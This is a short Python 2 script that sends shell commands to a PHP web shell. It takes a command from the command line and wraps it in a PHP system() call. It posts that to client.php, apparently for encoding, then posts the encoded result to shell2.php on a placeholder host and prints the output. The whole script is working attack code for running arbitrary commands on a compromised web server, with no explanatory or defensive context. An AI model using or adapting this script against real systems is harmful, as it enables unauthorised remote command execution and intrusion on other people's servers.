import requests
import base64
import sys
url1 = 'http://ip/shell2.php'
url2 = 'http://ip/client.php'

#r = requests.get(url2)
#print r.text

poc = sys.argv[1]
payload = 'system("{}");'.format(poc)

#payload = 'system("ls");'

r1 = requests.post(url2, {"cmd":payload})
enc = r1.text
r2 = requests.post(url1, {"cmd":enc})
print r2.text
